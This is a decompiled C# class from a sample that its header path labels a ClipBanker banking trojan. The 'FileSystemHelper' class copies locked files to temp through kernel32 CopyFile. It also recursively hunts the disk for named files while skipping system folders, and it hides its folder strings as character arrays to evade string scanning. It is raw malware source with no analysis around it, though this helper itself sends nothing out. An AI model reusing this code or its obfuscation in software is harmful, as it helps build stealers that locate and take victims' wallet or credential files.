// Decompiled with JetBrains decompiler
// Type: FtpClient.Data.Helpers.FileSystemHelper
// Assembly: Baignoire, Version=12.5.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 0AA7C5E4-9380-4A35-BE75-5D7E722D7BE8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-4d94148f1dff68b03896e3fa5508c5b039b0a29b1fd90db01884137f2e9495a4.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace FtpClient.Data.Helpers
{
  public static class FileSystemHelper
  {
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern bool CopyFile(
      string lpExistingFileName,
      string lpNewFileName,
      bool bFailIfExists);

    public static string TryCreateTemp(string filePath, out bool createdNew)
    {
      string empty = string.Empty;
      try
      {
        string tempFileName = Path.GetTempFileName();
        if (FileSystemHelper.CopyToTemp(filePath, tempFileName))
        {
          createdNew = true;
          return tempFileName;
        }
        FileSystemHelper.CloseLock(filePath);
        if (FileSystemHelper.CopyToTemp(filePath, tempFileName))
        {
          createdNew = true;
          return tempFileName;
        }
        createdNew = false;
        return filePath;
      }
      catch
      {
        createdNew = false;
        return filePath;
      }
    }

    public static bool CopyToTemp(string filePath, string temp)
    {
      try
      {
        return FileSystemHelper.CopyFile(filePath, temp, false);
      }
      catch (Exception ex)
      {
        return false;
      }
    }

    public static void CloseLock(string filePath)
    {
    }

    public static List<string> FindPaths(
      string baseDirectory,
      int maxLevel = 4,
      int level = 1,
      params string[] files)
    {
      List<string> stringList = new List<string>();
      stringList.Add(new string(new char[9]
      {
        '\\',
        'W',
        'i',
        'n',
        'd',
        'o',
        'w',
        's',
        '\\'
      }));
      stringList.Add(new string(new char[15]
      {
        '\\',
        'P',
        'r',
        'o',
        'g',
        'r',
        'a',
        'm',
        ' ',
        'F',
        'i',
        'l',
        'e',
        's',
        '\\'
      }));
      stringList.Add(new string(new char[21]
      {
        '\\',
        'P',
        'r',
        'o',
        'g',
        'r',
        'a',
        'm',
        ' ',
        'F',
        'i',
        'l',
        'e',
        's',
        ' ',
        '(',
        'x',
        '8',
        '6',
        ')',
        '\\'
      }));
      stringList.Add(new string(new char[14]
      {
        '\\',
        'P',
        'r',
        'o',
        'g',
        'r',
        'a',
        'm',
        ' ',
        'D',
        'a',
        't',
        'a',
        '\\'
      }));
      List<string> paths = new List<string>();
      if (files == null || files.Length == 0 || level > maxLevel)
        return paths;
      try
      {
        foreach (string directory in Directory.GetDirectories(baseDirectory))
        {
          bool flag1 = false;
          foreach (string str in stringList)
          {
            if (directory.Contains(str))
            {
              flag1 = true;
              break;
            }
          }
          if (!flag1)
          {
            try
            {
              DirectoryInfo directoryInfo = new DirectoryInfo(directory);
              FileInfo[] files1 = directoryInfo.GetFiles();
              bool flag2 = false;
              for (int index1 = 0; index1 < files1.Length && !flag2; ++index1)
              {
                for (int index2 = 0; index2 < files.Length && !flag2; ++index2)
                {
                  string file = files[index2];
                  FileInfo fileInfo = files1[index1];
                  if (file == fileInfo.Name)
                  {
                    flag2 = true;
                    paths.Add(fileInfo.FullName);
                  }
                }
              }
              foreach (string path in FileSystemHelper.FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
              {
                if (!paths.Contains(path))
                  paths.Add(path);
              }
            }
            catch
            {
            }
          }
        }
      }
      catch
      {
      }
      return paths;
    }
  }
}
